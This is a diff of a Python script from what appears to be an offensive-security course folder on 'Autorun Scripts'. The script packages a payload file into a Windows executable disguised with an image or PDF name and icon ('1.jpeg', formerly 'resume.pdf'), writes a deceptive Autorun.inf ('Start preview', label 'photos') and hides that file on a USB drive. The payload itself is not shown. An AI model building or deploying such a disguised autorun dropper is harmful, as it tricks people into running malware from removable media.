after moving and deleting to dotfiles/bin and deleting some outdated payloads

+++ Part_3/3.2 Autorun Scripts/USB.py
@@ -2,41 +2,44 @@ import PyInstaller.__main__
 import shutil
 import os
 
-filename = "malicious.py"
-exename = "resume.pdf"
-icon = "pdf.ico"
+filename = "payload.py"
+exename = "1.jpeg"
+icon = "jpg.ico"
 pwd = os.getcwd()
-usbdir = os.path.join(pwd,"USB")
+usbdir = os.path.join(pwd, "")
 
 if os.path.isfile(exename):
     os.remove(exename)
 
 # Create executable from Python script
 PyInstaller.__main__.run([
-    "malicious.py",
+    "payload.py",
     "--onefile",
     "--clean",
     "--log-level=ERROR",
-    "--name="+exename,
-    "--icon="+icon
+    "--name=" + exename,
+    "--icon=" + icon
 ])
 
 # Clean up after Pyinstaller
-shutil.move(os.path.join(pwd,"dist",exename),pwd)
+shutil.move(os.path.join(pwd, "dist", exename), pwd)
 shutil.rmtree("dist")
 shutil.rmtree("build")
-shutil.rmtree("__pycache__")
-os.remove(exename+".spec")
+
+if os.path.exists("__pycache__"):
+    shutil.rmtree("__pycache__")
+
+os.remove(exename + ".spec")
 
 # Create Autorun File
-with open("Autorun.inf","w") as o:
+with open("Autorun.inf", "w") as o:
     o.write("(Autorun)\n")
-    o.write("Open="+exename+"\n")
-    o.write("Action=Start adobe acrobat\n")
-    o.write("Label=My USB\n")
-    o.write("Icon="+exename+"\n")
+    o.write("Open=" + exename + "\n")
+    o.write("Action=Start preview\n")
+    o.write("Label=photos\n")
+    o.write("Icon=" + exename + "\n")
 
 # Move files to USB and set to hidden
-shutil.move(exename,usbdir)
-shutil.move("Autorun.inf",usbdir)
-os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
+shutil.move(exename, usbdir)
+shutil.move("Autorun.inf", usbdir)
+os.system("attrib +h " + os.path.join(usbdir, "Autorun.inf"))
